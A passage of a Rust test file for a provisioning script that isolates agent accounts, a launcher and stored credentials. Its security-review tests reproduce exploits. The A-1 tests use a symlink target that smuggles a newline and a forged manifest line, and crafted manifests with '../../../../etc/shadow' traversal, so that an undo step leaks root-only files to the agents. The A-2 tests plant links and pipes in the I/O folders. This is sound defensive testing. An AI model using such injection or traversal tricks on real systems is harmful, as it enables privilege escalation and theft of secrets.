        ),
        (0o755, "root:root")
    );
    for (i, a) in slot_accounts(8).iter().enumerate() {
        let n = i + 1;
        assert_eq!(
            m.mode(&format!("var/lib/agent-slots/{n}")),
            0o750,
            "slot {n}'s folder"
        );
        assert_eq!(
            m.owner(&format!("var/lib/agent-slots/{n}")),
            format!("agent-launch:{a}")
        );
        assert_eq!(
            m.mode(&format!("var/lib/agent-slots/{n}/trash")),
            0o700,
            "slot {n}'s Trash"
        );
        assert!(
            m.owner(&format!("var/lib/agent-slots/{n}/trash"))
                .starts_with("agent-launch:"),
            "slot {n}'s Trash belongs to the launcher, not the slot"
        );
    }
    assert_eq!(m.mode("var/lib/agent-launch"), 0o700);
    assert!(m.owner("var/lib/agent-launch").starts_with("agent-launch:"));
    // DELIBERATE EVAL CHANGE (I-A2): `specs` and `logs` moved to /var/lib/agent-launch-io
    // (root-owned; tested in the A-2 tests below). Only `out` stays in the launcher's folder.
    // S7 (lint only, no assertion changed): the loop over one element is a block.
    {
        let d = "out";
        assert!(
            m.exists(&format!("var/lib/agent-launch/{d}")),
            "var/lib/agent-launch/{d}"
        );
        assert_eq!(
            m.mode(&format!("var/lib/agent-launch/{d}")) & 0o077,
            0,
            "{d} must be private"
        );
        assert!(
            m.owner(&format!("var/lib/agent-launch/{d}"))
                .starts_with("agent-launch:")
        );
    }
}

/// The delivered login moves into the system credential store: both files
/// exist, root-only (0600), the secret ID stored decodes to the delivered one,
/// the administrator's copy is gone, and the secret ID is never on a command
/// line (only systemd-creds's standard input and output carry it). Design
/// section 8, step 4.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn the_login_moves_into_the_system_store_by_pipe_and_leaves_taylors_account() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    for f in [
        "etc/credstore.encrypted/agent-sign.secret-id",
        "etc/credstore.encrypted/agent-sign.role-id",
    ] {
        assert!(m.exists(f), "{f}");
        assert_eq!(m.mode(f), 0o600, "{f} must be readable by root only");
    }
    let stored = m
        .read("etc/credstore.encrypted/agent-sign.secret-id")
        .unwrap();
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(stored.trim())
        .unwrap();
    assert_eq!(decoded, SECRET_ID.as_bytes());
    assert!(
        !m.exists("home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner"),
        "Taylor's copy of the login must be removed once it is stored"
    );
    for c in m.calls() {
        assert!(
            !c.args.contains(SECRET_ID),
            "the secret ID was on a command line: {} {}",
            c.name,
            c.args
        );
    }
    for (_, _, cmd) in m.sudo_log() {
        assert!(
            !cmd.contains(SECRET_ID),
            "the secret ID was on a sudo command line: {cmd}"
        );
    }
}

/// E1: after the script moves the delivered login into the system store, an end check says
/// so in one PASS line that names both ends: Taylor's copy (the path the logins sitting
/// delivered it to, here under the test root) is gone, and the installed credential is
/// present. Under the test root both paths are the stand-in ones.
///
/// Fails today: the one login check says "gone from taylor's account" without naming either
/// path, so nothing shows which copy was looked for.
#[test]
fn e1_an_end_check_names_taylors_copy_as_gone_and_the_installed_credential_as_present() {
    let m = Machine::new();
    let run = m.sitting(&[]);
    must_succeed(&run, "the run");
    assert!(
        !m.exists("home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner")
            && m.exists("etc/credstore.encrypted/agent-sign.secret-id")
    );
    let delivered = m
        .path("home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner")
        .to_string_lossy()
        .to_string();
    let stored = m
        .path("etc/credstore.encrypted/agent-sign.secret-id")
        .to_string_lossy()
        .to_string();
    let hit = check_lines(&run)
        .into_iter()
        .find(|(t, n)| t == "PASS" && n.contains(&delivered) && n.contains(&stored));
    let (_, name) = hit.unwrap_or_else(|| {
        panic!(
            "no PASS line naming both {delivered} and {stored}\n{}",
            run.stdout
        )
    });
    let low = name.to_lowercase();
    assert!(
        (low.contains("gone") || low.contains("removed") || low.contains("absent"))
            && (low.contains("present") || low.contains("installed")),
        "the line must say the delivered copy is gone and the installed one present: {name}"
    );
}

// ================================================================ the review of 1 Nov 2026
//
// An independent reviewer (dispatched by the suite PM) read scripts/sitting at
// agent-sign 16c22ba. These tests were written BEFORE the fixes, by an agent
// other than their builder, to the orchestrator's interfaces (see the module
// doc). Each doc comment names the finding. Where a finding can't be shown
// without root or a real systemd, the test is static (it reads the unit files
// or the script) or uses the stand-ins, and says so.

const CANARY: &str = "ROOT-ONLY-CANARY-3b9f1d2c";
const NEW_SECRET_ID: &str = "9f8e7d6c-5b4a-4321-8fed-cba987654321";
const LOGIN_NAME: &str = "agent-sign-hetzner";
const DELIVERED_LOGIN: &str = "home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner";
const STORED_SECRET_REL: &str = "etc/credstore.encrypted/agent-sign.secret-id";
const STORED_ROLE_REL: &str = "etc/credstore.encrypted/agent-sign.role-id";
const IO: &str = "var/lib/agent-launch-io";
const SAVED_MANIFEST: &str = "var/lib/agent-sign-sitting/before/manifest";

// ---- helpers for the review tests

/// The folder the script under test lives in (its `files/` and `lib.sh` are next to it).
fn sitting_dir() -> PathBuf {
    script_path()
        .parent()
        .expect("the script's folder")
        .to_path_buf()
}

/// `Key=Value` lines of a systemd unit (comments, blanks and section headers dropped).
fn unit_directives(text: &str) -> Vec<(String, String)> {
    text.lines()
        .map(str::trim)
        .filter(|l| {
            !l.is_empty() && !l.starts_with('#') && !l.starts_with(';') && !l.starts_with('[')
        })
        .filter_map(|l| l.split_once('='))
        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
        .collect()
}

/// Every path systemd opens AS ROOT before it drops to the unit's user:
/// credentials it loads, files it opens for the standard streams, environment files.
fn root_opened_paths(unit: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for (k, v) in unit_directives(unit) {
        match k.as_str() {
            "LoadCredential" | "LoadCredentialEncrypted" => {
                if let Some((_, p)) = v.split_once(':') {
                    out.push((k, p.to_string()));
                }
            }
            "StandardInput" => {
                if let Some(p) = v.strip_prefix("file:") {
                    out.push((k, p.to_string()));
                }
            }
            "StandardOutput" | "StandardError" => {
                for pre in ["file:", "append:", "truncate:"] {
                    if let Some(p) = v.strip_prefix(pre) {
                        out.push((k.clone(), p.to_string()));
                    }
                }
            }
            "EnvironmentFile" => out.push((k, v.trim_start_matches('-').to_string())),
            _ => {}
        }
    }
    out
}

/// Control characters (other than newline and tab) in a text, as `U+XXXX`.
fn raw_controls(text: &str) -> Vec<String> {
    let mut seen = BTreeSet::new();
    for c in text.chars() {
        if (c < ' ' && c != '\n' && c != '\t') || c == '\u{7f}' {
            seen.insert(format!("U+{:04X}", c as u32));
        }
    }
    seen.into_iter().collect()
}

fn decoded(m: &Machine, rel: &str) -> Option<String> {
    let t = m.read(rel)?;
    let b = base64::engine::general_purpose::STANDARD
        .decode(t.trim())
        .ok()?;
    String::from_utf8(b).ok()
}

fn canary_in_agents_files(m: &Machine) -> Vec<String> {
    m.all_files()
        .into_iter()
        .filter(|(p, b)| p.starts_with(m.path("home/agents")) && contains(b, CANARY))
        .map(|(p, _)| p.display().to_string())
        .collect()
}

/// The script's whole text, `lib.sh` included (what a static check reads).
fn sitting_sources() -> String {
    let main = fs::read_to_string(script_path()).expect("the sitting script");
    let lib = fs::read_to_string(sitting_dir().join("lib.sh")).unwrap_or_default();
    format!("{main}\n{lib}")
}

/// The shell functions of a script: (name, body lines). Handles `name() {` at column
/// 0 with the body to a lone `}`, and one-line functions.
fn shell_functions(text: &str) -> Vec<(String, Vec<String>)> {
    let lines: Vec<&str> = text.lines().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < lines.len() {
        let l = lines[i];
        if let Some(pos) = l.find("() {")
            && !l.starts_with([' ', '\t', '#'])
        {
            let name = l[..pos].trim().to_string();
            if !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                let rest = &l[pos + 4..];
                if l.trim_end().ends_with('}') && !rest.trim().is_empty() {
                    out.push((name, vec![rest.trim().trim_end_matches('}').to_string()]));
                } else {
                    let mut body = vec![rest.to_string()];
                    i += 1;
                    while i < lines.len() && lines[i] != "}" {
                        body.push(lines[i].to_string());
                        i += 1;
                    }
                    out.push((name, body));
                }
            }
        }
        i += 1;
    }
    out
}

/// Whether `w` appears in `line` as a whole word (not part of a longer name).
fn has_word(line: &str, w: &str) -> bool {
    let b = line.as_bytes();
    let mut from = 0;
    while let Some(p) = line[from..].find(w) {
        let s = from + p;
        let e = s + w.len();
        let word = |c: u8| c.is_ascii_alphanumeric() || c == b'_';
        let before_ok = s == 0 || !word(b[s - 1]);
        let after_ok = e >= b.len() || !word(b[e]);
        if before_ok && after_ok {
            return true;
        }
        from = e;
    }
    false
}

// ---- helpers for the network ranges (A-4)

#[derive(Clone, Copy, Debug)]
struct Cidr {
    v6: bool,
    addr: u128,
    len: u32,
}

fn parse_cidr(s: &str) -> Option<Cidr> {
    let (a, p) = match s.split_once('/') {
        Some((a, p)) => (a, Some(p)),
        None => (s, None),
    };
    if let Ok(ip) = a.parse::<std::net::Ipv4Addr>() {
        let len: u32 = match p {
            Some(p) => p.parse().ok()?,
            None => 32,
        };
        (len <= 32).then_some(Cidr {
            v6: false,
            addr: u32::from(ip) as u128,
            len,
        })
    } else if let Ok(ip) = a.parse::<std::net::Ipv6Addr>() {
        let len: u32 = match p {
            Some(p) => p.parse().ok()?,
            None => 128,
        };
        (len <= 128).then_some(Cidr {
            v6: true,
            addr: u128::from(ip),
            len,
        })
    } else {
        None
    }
}

fn cidr(s: &str) -> Cidr {
    parse_cidr(s).unwrap_or_else(|| panic!("test bug: {s} is not an address range"))
}

/// Whether the range `d` contains the whole range `r`.
fn covers(d: &Cidr, r: &Cidr) -> bool {
    if d.v6 != r.v6 || d.len > r.len {
        return false;
    }
    if d.len == 0 {
        return true;
    }
    let bits = if d.v6 { 128 } else { 32 };
    let shift = bits - d.len;
    (d.addr >> shift) == (r.addr >> shift)
}

/// The ranges one `IPAddressDeny=` / `IPAddressAllow=` value stands for (systemd's keywords expanded).
fn expand_ranges(v: &str) -> Vec<Cidr> {
    match v {
        "localhost" => vec![cidr("127.0.0.0/8"), cidr("::1/128")],
        "link-local" => vec![cidr("169.254.0.0/16"), cidr("fe80::/10")],
        "multicast" => vec![cidr("224.0.0.0/4"), cidr("ff00::/8")],
        "any" => vec![cidr("0.0.0.0/0"), cidr("::/0")],
        other => vec![parse_cidr(other).unwrap_or_else(|| {
            panic!("an IPAddressDeny/Allow value that is not an address range: {other}")
        })],
    }
}

/// Every `systemd-run` call the stand-in saw, as its argument list (in order).
fn systemd_run_calls(m: &Machine) -> Vec<Vec<String>> {
    let mut out = Vec::new();
    let mut n = 1;
    while let Ok(b) = fs::read(m.log.join(format!("sr.{n}.args"))) {
        out.push(
            b.split(|c| *c == 0x1f)
                .filter(|s| !s.is_empty())
                .map(|s| String::from_utf8_lossy(s).to_string())
                .collect(),
        );
        n += 1;
    }
    out
}

/// The values (split on spaces) of every property called `key` set on a systemd-run call.
fn props(call: &[String], key: &str) -> Vec<String> {
    let mut out = Vec::new();
    for a in call {
        let a = a.strip_prefix("--property=").unwrap_or(a);
        if let Some(v) = a.strip_prefix(&format!("{key}=")) {
            out.extend(v.split_whitespace().map(String::from));
        }
    }
    out
}

impl Machine {
    /// The script with this machine's commit, an explicit `--source`, plus `extra`.
    fn sitting_from(&self, source: &Path, extra: &[&str]) -> Run {
        let commit = self.commit.clone();
        let source = source.to_string_lossy().to_string();
        let mut args = vec![
            "--machine",
            MACHINE,
            "--commit",
            &commit,
            "--source",
            &source,
        ];
        args.extend_from_slice(extra);
        self.run_with(&args, PREFIX, &[])
    }
}

/// The run stopped plainly and the machine and the stand-ins' change log are exactly as they were.
fn must_refuse_before_any_change(
    m: &Machine,
    run: &Run,
    before: &BTreeMap<String, String>,
    what: &str,
    keywords: &[&str],
) {
    must_stop_plainly(run, what, keywords);
    let d = diff(before, &m.snap());
    assert!(d.is_empty(), "{what}: the machine changed: {d:?}");
    assert!(
        m.mutations().is_empty(),
        "{what}: changes were made: {:?}",
        m.mutations()
    );
}

// ---------------------------------------------------------------- A-1 (HIGH)

/// A-1, the reviewer's exploit. The agents make `~agents/.agent-sign/bin/agent-git`
/// a link whose target holds a newline and a forged manifest line
/// (`x\ngitconfig|file|644|../../../../etc/shadow`). Unescaped, the target became a
/// manifest line, and `--undo` read the root-only file through `$SAVE/../..` and
/// wrote it into the agents' `~/.gitconfig`. Required (reviewer's fix): the link
/// is refused when the copies are saved, and no root-only file ever reaches the
/// agents' files, through the run or the undo; no root command is built from a
/// `..` path.
///
/// Fails today: the run succeeds and `--undo` copies the planted root file (a
/// canary) into `home/agents/.gitconfig`.
#[test]
fn a1_a_link_target_holding_a_newline_and_a_pipe_is_refused_at_save_and_no_root_file_reaches_the_agents()
 {
    let m = Machine::new();
    m.put("etc/shadow", &format!("{CANARY}\n"), 0o600);
    let link = m.path("home/agents/.agent-sign/bin/agent-git");
    fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink("x\ngitconfig|file|644|../../../../etc/shadow", &link).unwrap();
    let agents_before = m.agents_home();

    let run = m.sitting(&[]);
    let agents_after_run = m.agents_home();
    let service_after_run = m.unit("user", "agent-signd.service");
    let n = m.sudo_log().len();
    let _undo = m.sitting(&["--undo"]);

    // The exploit first: nothing of root's reaches the agents.
    let leaked = canary_in_agents_files(&m);
    assert!(
        leaked.is_empty(),
        "A-1: a root-only file was copied into the agents' files by --undo: {leaked:?}"
    );
    for (_, _, cmd) in m.sudo_log().iter().skip(n) {
        assert!(
            !cmd.contains("etc/shadow") && !cmd.contains(".."),
            "A-1: undo built a root command from an agent-controlled path: {cmd}"
        );
    }
    // The fix: refused at save, with the agents' files and service untouched.
    must_stop_plainly(
        &run,
        "a link target with a newline and a pipe",
        &["link", "agent-git", "newline", "target", "refus", "unsafe"],
    );
    let d = diff(&agents_before, &agents_after_run);
    assert!(
        d.is_empty(),
        "the agents' files changed although the save was refused: {d:?}"
    );
    assert!(
        service_after_run.active && service_after_run.enabled && !service_after_run.masked,
        "the agents' own service must still run after a refused save"
    );
    let manifest = m.read(SAVED_MANIFEST).unwrap_or_default();
    assert!(
        !manifest.contains("etc/shadow"),
        "the saved manifest holds text made from the agent's link target:\n{manifest}"
    );
}

/// A-1, the second half: a crafted manifest (root's own file, here edited by the
/// test as the reviewer's attacker would after a forged save) must never make
/// `--undo` read outside the saved folder, write a copy under another name, apply
/// a mode that isn't plain octal, or touch a path outside the agents' three files
/// and five bin entries. Cases: the saved name climbs out (`../../../../etc/shadow`,
/// also through the allowed `agents-bin/`); a saved name of another label's copy;
/// a mode `a+rwx`; a label that climbs out of the bin folder; the reviewer's forged
/// line appended. After each undo: no root-only canary in any agents' file, no root
/// command built from a `..` path, and the case's own harm absent. (Fix: a fixed
/// label-to-file map, an exact allow-list of saved names, mode `^[0-7]{3,4}$`.)
///
/// If the sitting no longer keeps a manifest in this format, the field-editing
/// cases are skipped (nothing to craft); the appended-line cases still run.
///
/// Fails today: undo copies the canary, the wrong copy, applies `a+rwx` and makes
/// `~/.bashrc` a link.
#[test]
fn a1_a_crafted_manifest_never_makes_undo_read_outside_the_saved_folder_or_write_where_it_should_not()
 {
    let cases = [
        "the saved name climbs out",
        "the saved name climbs out through the allowed folder",
        "the saved name is another label's copy",
        "the mode is not octal",
        "the label climbs out of the bin folder",
        "the reviewer's forged line appended",
    ];
    let mut crafted = 0;
    let mut problems: Vec<String> = Vec::new();
    for case in cases {
        let m = Machine::new();
        m.put("etc/shadow", &format!("{CANARY}\n"), 0o600);
        let signers_before = m.read("home/agents/.config/git/allowed_signers").unwrap();
        must_succeed(&m.sitting(&[]), &format!("{case}: the run"));
        let Some(text) = m.read(SAVED_MANIFEST) else {
            continue; // no manifest of this kind: nothing to craft
        };
        let mut lines: Vec<String> = text.lines().map(String::from).collect();
        let gi = lines.iter().position(|l| l.starts_with("gitconfig|file|"));
        let edit = |lines: &mut Vec<String>, field: usize, value: &str| -> bool {
            let Some(i) = gi else { return false };
            let mut f: Vec<String> = lines[i].split('|').map(String::from).collect();
            if f.len() <= field {
                return false;
            }
            f[field] = value.to_string();
            lines[i] = f.join("|");
            true
        };
        let did = match case {
            "the saved name climbs out" => edit(&mut lines, 3, "../../../../etc/shadow"),
            "the saved name climbs out through the allowed folder" => {
                edit(&mut lines, 3, "agents-bin/../../../../../etc/shadow")
            }
            "the saved name is another label's copy" => {
                edit(&mut lines, 3, "agents-allowed_signers")
            }
            "the mode is not octal" => edit(&mut lines, 2, "a+rwx"),
            "the label climbs out of the bin folder" => {
                lines.push("bin/../../.bashrc|link|/etc/passwd|".to_string());
                true
            }
            _ => {
                lines.push("gitconfig|file|644|../../../../etc/shadow".to_string());
                true
            }
        };
        if !did {
            continue;
        }
        crafted += 1;
        m.put(SAVED_MANIFEST, &format!("{}\n", lines.join("\n")), 0o600);
        let n = m.sudo_log().len();
        let _undo = m.sitting(&["--undo"]);

        let leaked = canary_in_agents_files(&m);
        if !leaked.is_empty() {
            problems.push(format!(
                "{case}: undo copied a root-only file into the agents' files: {leaked:?}"
            ));
        }
        for (_, _, cmd) in m.sudo_log().iter().skip(n) {
            if cmd.contains("etc/shadow") || cmd.contains("..") {
                problems.push(format!(
                    "{case}: undo built a root command from a path that climbs out: {cmd}"
                ));
            }
        }
        match case {
            "the saved name is another label's copy"
                if m.read("home/agents/.gitconfig").as_deref() == Some(signers_before.as_str()) =>
            {
                problems.push(format!(
                    "{case}: the agents' git config was restored from the allowed_signers copy"
                ))
            }
            "the mode is not octal" if m.mode("home/agents/.gitconfig") & 0o002 != 0 => problems
                .push(format!(
                    "{case}: a mode written as `a+rwx` was applied to the agents' git config"
                )),
            "the label climbs out of the bin folder" if m.link("home/agents/.bashrc").is_some() => {
                problems.push(format!("{case}: undo made the agents' ~/.bashrc a link"))
            }
            _ => {}
        }
    }
    assert!(
        crafted >= 2,
        "the appended-line cases should always be crafted (crafted {crafted})"
    );
    assert!(
        problems.is_empty(),
        "A-1: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
}

// ---------------------------------------------------------------- A-2 (HIGH), sitting side

/// A-2, I-A2: the launcher's I/O folder. After a run, `/var/lib/agent-launch-io`,
/// `specs/` and `logs/` exist, root-owned with group agent-launch, mode 0750, so no
/// account but root can make, rename or remove an entry in them; for every slot
/// 1..N there is exactly one `specs/<n>.json` and one `logs/<n>.out`, a regular file
/// owned agent-launch:agent-launch, mode 0600, and nothing else is in the folders.
/// The launcher's own folder no longer holds `specs/` or `logs/`. `--slots` raises
/// the files, lowering deletes none; a dry run makes nothing and names the folder.
///
/// Fails today: nothing is made under `var/lib/agent-launch-io`.
#[test]
fn a2_the_launcher_io_folders_and_one_file_per_slot_are_made_root_owned_and_exclusive() {
    let check = |m: &Machine, n: usize, what: &str| {
        for d in [IO.to_string(), format!("{IO}/specs"), format!("{IO}/logs")] {
            assert!(m.exists(&d), "{what}: {d} should exist");
            assert_eq!(m.mode(&d), 0o750, "{what}: {d} must be 0750");
            assert_eq!(
                m.owner(&d),
                "root:agent-launch",
                "{what}: {d} must be root's, group agent-launch"
            );
        }
        for (dir, ext) in [("specs", "json"), ("logs", "out")] {
            let mut names: Vec<String> = fs::read_dir(m.path(&format!("{IO}/{dir}")))
                .unwrap()
                .flatten()
                .map(|e| e.file_name().to_string_lossy().to_string())
                .collect();
            names.sort();
            let mut want: Vec<String> = (1..=n).map(|i| format!("{i}.{ext}")).collect();
            want.sort();
            assert_eq!(names, want, "{what}: the entries of {IO}/{dir}");
            for name in &want {
                let rel = format!("{IO}/{dir}/{name}");
                let md = fs::symlink_metadata(m.path(&rel)).unwrap();
                assert!(
                    md.file_type().is_file(),
                    "{what}: {rel} must be a regular file"
                );
                assert_eq!(m.mode(&rel), 0o600, "{what}: {rel} must be 0600");
                assert_eq!(
                    m.owner(&rel),
                    "agent-launch:agent-launch",
                    "{what}: {rel} must belong to the launcher"
                );
            }
        }
    };
    let m = Machine::new();
    let dry = m.sitting(&["--dry-run"]);
    must_succeed(&dry, "dry run");
    assert!(
        dry.stdout.contains("agent-launch-io"),
        "a dry run should say it would make the I/O folder\n{}",
        dry.stdout
    );
    assert!(!m.exists(IO), "a dry run made the I/O folder");
    must_succeed(&m.sitting(&[]), "the run (8 slots)");
    check(&m, 8, "8 slots");
    assert!(
        !m.exists("var/lib/agent-launch/specs") && !m.exists("var/lib/agent-launch/logs"),
        "specs/ and logs/ are no longer made in the launcher's own folder"
    );

    let m = Machine::new();
    must_succeed(&m.sitting(&["--slots", "3"]), "3 slots");
    check(&m, 3, "3 slots");
    must_succeed(&m.sitting(&["--slots", "5"]), "raised to 5");
    check(&m, 5, "raised to 5");
    m.put(&format!("{IO}/logs/5.out"), "a session's output\n", 0o600);
    must_succeed(&m.sitting(&["--slots", "2"]), "lowered to 2");
    assert_eq!(
        m.read(&format!("{IO}/logs/5.out")).as_deref(),
        Some("a session's output\n"),
        "lowering the slot count must delete or change no I/O file"
    );
    for i in 1..=5 {
        assert!(m.exists(&format!("{IO}/specs/{i}.json")), "specs/{i}.json");
    }
}

/// A-2, I-A2: an existing entry in the I/O folders that isn't exactly a regular
/// file (not a link, folder, pipe, or file with a second link, and mode 0600)
/// stops the sitting with a plain message, and the sitting follows nothing, replaces
/// nothing and removes nothing: a link to a root file is left as it is and its target
/// is not written. The folders exist already, correctly. (The owner of an existing
/// entry is not checked here: the stand-ins can't hold owners for files they didn't
/// make; the real machine checks it.)
///
/// Fails today: the I/O folder is not looked at (the run succeeds and makes no I/O
/// files).
#[test]
fn a2_an_existing_entry_that_is_not_exactly_a_launcher_file_stops_the_sitting_and_follows_nothing()
{
    let mut problems: Vec<String> = Vec::new();
    for case in [
        "a link at specs/2.json",
        "a folder at logs/3.out",
        "a file with mode 0644 at specs/1.json",
        "a file with a second link at logs/1.out",
        "a named pipe at specs/4.json",
    ] {
        let m = Machine::new();
        m.put("etc/target-file", "TARGET\n", 0o644);
        for d in [IO.to_string(), format!("{IO}/specs"), format!("{IO}/logs")] {
            fs::create_dir_all(m.path(&d)).unwrap();
            fs::set_permissions(m.path(&d), fs::Permissions::from_mode(0o750)).unwrap();
        }
        let (rel, words): (String, &[&str]) = match case {
            "a link at specs/2.json" => {
                let p = format!("{IO}/specs/2.json");
                std::os::unix::fs::symlink("../../../../etc/target-file", m.path(&p)).unwrap();
                (p, &["2.json", "specs", "launch-io"])
            }
            "a folder at logs/3.out" => {
                let p = format!("{IO}/logs/3.out");
                fs::create_dir(m.path(&p)).unwrap();
                (p, &["3.out", "logs", "launch-io"])
            }
            "a file with mode 0644 at specs/1.json" => {
                let p = format!("{IO}/specs/1.json");
                m.put(&p, "{}\n", 0o644);
                (p, &["1.json", "specs", "launch-io"])
            }
            "a file with a second link at logs/1.out" => {
                let p = format!("{IO}/logs/1.out");
                m.put(&p, "", 0o600);
                fs::hard_link(m.path(&p), m.top.join("another-name")).unwrap();
                (p, &["1.out", "logs", "launch-io"])
            }
            _ => {
                let p = format!("{IO}/specs/4.json");
                let ok = Command::new("mkfifo")
                    .arg(m.path(&p))
                    .status()
                    .expect("mkfifo")
                    .success();
                assert!(ok, "mkfifo");
                (p, &["4.json", "specs", "launch-io"])
            }
        };
        let before_entry = fs::symlink_metadata(m.path(&rel)).unwrap();
        let run = m.sitting(&[]);
        let after_entry = fs::symlink_metadata(m.path(&rel)).unwrap();
        let key = |e: &fs::Metadata| {
            (
                e.file_type(),
                e.permissions().mode(),
                std::os::unix::fs::MetadataExt::ino(e),
            )
        };
        if key(&before_entry) != key(&after_entry) {
            problems.push(format!("{case}: the entry was replaced or changed"));
        }
        if m.read("etc/target-file").as_deref() != Some("TARGET\n") {
            problems.push(format!(
                "{case}: a link was followed and its target written"
            ));
        }
        if run.code == 0 {
            problems.push(format!(
                "{case}: the run went on (exit 0) over a bad I/O entry"
            ));
            continue;
        }
        let t = run.text();
        let low = t.to_lowercase();
        if !t.lines().any(|l| l.trim_start().starts_with("Stopped:"))
            || !words.iter().any(|w| low.contains(&w.to_lowercase()))
        {
            problems.push(format!(
                "{case}: no plain `Stopped:` line naming the entry ({words:?})\n{t}"
            ));
        }
        if m.exists("etc/agent-sign/system.toml")
            || m.unit("system", "agent-launchd.service").active
        {
            problems.push(format!(
                "{case}: the sitting went on to start the launcher over a bad I/O folder"
            ));
        }
    }
    assert!(
        problems.is_empty(),
        "A-2: {} problem(s):\n{}",
        problems.len(),
        problems.join("\n")
    );
}

/// A-2, I-A2, the unit files (static: the real units need systemd as root). Every
/// path systemd opens as root for a slot unit (`LoadCredential=`, `StandardInput=file:`,
/// `StandardOutput=` and `StandardError=` with `file:`, `append:` or `truncate:`,
/// `EnvironmentFile=`) lies under `/var/lib/agent-launch-io/`, and none under the
/// launcher's own `/var/lib/agent-launch/`; the spec is `specs/%i.json` and the output
/// `logs/%i.out`; and the launcher's unit may write the I/O folder (`ProtectSystem=strict`).
///
/// Not shown (needs root and systemd v259): that systemd really opens nothing else,
/// e.g. `BindPaths=/var/lib/agent-slots/%i/current` is a root-time mount of a path in
/// a folder the launcher owns, which the review did not name and this test leaves out.
///
/// Fails today: the units open `/var/lib/agent-launch/specs/%i.json` and `logs/%i.out`.
#[test]
fn a2_every_path_systemd_opens_as_root_for_a_slot_unit_is_under_the_root_owned_io_folder() {
    let files = sitting_dir().join("files");
    let read = |n: &str| fs::read_to_string(files.join(n)).unwrap_or_else(|e| panic!("{n}: {e}"));
    let session = read("agent-session@.service");
    let end = read("agent-session-end@.service");
    for (name, text, at_least) in [
        ("agent-session@.service", &session, 3usize),
        ("agent-session-end@.service", &end, 2usize),
    ] {
        let paths = root_opened_paths(text);
        assert!(
            paths.len() >= at_least,
            "{name}: expected at least {at_least} root-opened paths, parsed {paths:?}"
        );
        for (directive, p) in &paths {
            assert!(
                p.starts_with("/var/lib/agent-launch-io/"),
                "{name}: {directive} makes root open {p}, which is outside /var/lib/agent-launch-io/"
            );
            assert!(
                !p.starts_with("/var/lib/agent-launch/"),
                "{name}: {directive} makes root open {p}, in the launcher's own folder"
            );
        }
    }
    let sp = root_opened_paths(&session);
    assert!(
        sp.iter()
            .any(|(d, p)| d == "LoadCredential" && p == "/var/lib/agent-launch-io/specs/%i.json"),
        "the session's spec must be loaded from /var/lib/agent-launch-io/specs/%i.json: {sp:?}"
    );
    for text in [&session, &end] {
        for d in ["StandardOutput", "StandardError"] {
            assert!(
                root_opened_paths(text)
                    .iter()
                    .any(|(k, p)| k == d && p == "/var/lib/agent-launch-io/logs/%i.out"),
                "{d} must be logs/%i.out under /var/lib/agent-launch-io"
            );
        }
    }
    let launcher = read("agent-launchd.service");
    assert!(
        unit_directives(&launcher)
            .iter()
            .any(|(k, v)| k == "ReadWritePaths"
                && v.split_whitespace()
                    .any(|p| p.trim_start_matches('-').trim_end_matches('/')
                        == "/var/lib/agent-launch-io")),
        "the launcher (ProtectSystem=strict) must be allowed to write /var/lib/agent-launch-io"
    );
}

// ---------------------------------------------------------------- A-3 (MEDIUM)

/// A-3, I-A3, dynamic. The installed `agent-sign` the script runs (the health check)
/// runs with no cached sudo ticket: the script ends the ticket with `sudo -k` (through
/// its own sudo wrapper) before the first run of an installed program, and a root step
/// after it asks again with a named prompt (every prompt is checked by the other
/// tests). The stand-in sudo models the ticket and the installed programs record
/// whether it was cached. Also: nothing from the source archive is ever run (the
/// archive's own `check-binary-clean.sh` is hostile here and leaves a marker).
///
/// Not shown (real-machine checks skipped under a test root): the probe launch and
/// the end-check launches. The static test below covers them.
///
/// Fails today: no `sudo -k` at all; the health check runs with the ticket cached; and
/// the archive's script is run.
#[test]
fn a3_installed_programs_and_the_sources_files_never_run_while_a_sudo_ticket_is_cached() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let tickets = fs::read_to_string(m.log.join("program-ticket")).unwrap_or_default();
    let runs: Vec<Vec<&str>> = tickets
        .lines()
        .map(|l| l.splitn(4, '\t').collect::<Vec<_>>())
        .filter(|f| f.get(2) == Some(&"as=taylor"))
        .collect();
    assert!(
        !runs.is_empty(),
        "the script ran no installed program as the administrator (the health check)"
    );
    for f in &runs {
        assert_eq!(
            f[1], "ticket=none",
            "A-3: an installed program ran with sudo's ticket cached: {f:?}"
        );
    }
    let k = m
        .calls()
        .into_iter()
        .find(|c| c.name == "sudo-k")
        .expect("A-3: the script never ran `sudo -k`");
    let first_run: u32 = runs[0][0].parse().unwrap();
    assert!(
        k.seq < first_run,
        "sudo -k (call {}) must come before the first installed program runs (call {first_run})",
        k.seq
    );
    assert!(
        !m.top.join("source-script-ran").exists(),
        "A-3: a script from the source archive was run: {:?}",
        fs::read_to_string(m.top.join("source-script-ran"))
    );
}

/// A-3, I-A3: `check-binary-clean.sh` comes from the sitting's own reviewed folder,
/// never from the source. The copy in `scripts/sitting/files/` is byte-identical to
/// `scripts/check-binary-clean.sh`; a poisoned build is still refused when the
/// archive's own copy would approve it (the hostile one in the test source); and the
/// script text never extracts or runs a script from the source.
///
/// Fails today: there is no copy in the sitting's folder, the hostile archive script
/// approves a poisoned build, and the script runs `$WORK/src/scripts/...`.
#[test]
fn a3_check_binary_clean_comes_from_the_reviewed_folder_not_the_archive() {
    let mine = sitting_dir().join("files/check-binary-clean.sh");
    let theirs = Path::new(env!("CARGO_MANIFEST_DIR")).join("scripts/check-binary-clean.sh");
    let a = fs::read(&mine).unwrap_or_else(|e| {
        panic!(
            "A-3: {} should exist (the reviewed copy the sitting runs): {e}",
            mine.display()
        )
    });
    assert_eq!(
        a,
        fs::read(&theirs).unwrap(),
        "the sitting's copy of check-binary-clean.sh must be identical to scripts/check-binary-clean.sh"
    );

    let m = Machine::new();
    m.make_build(true);
    let run = m.sitting(&[]);
    must_stop_plainly(
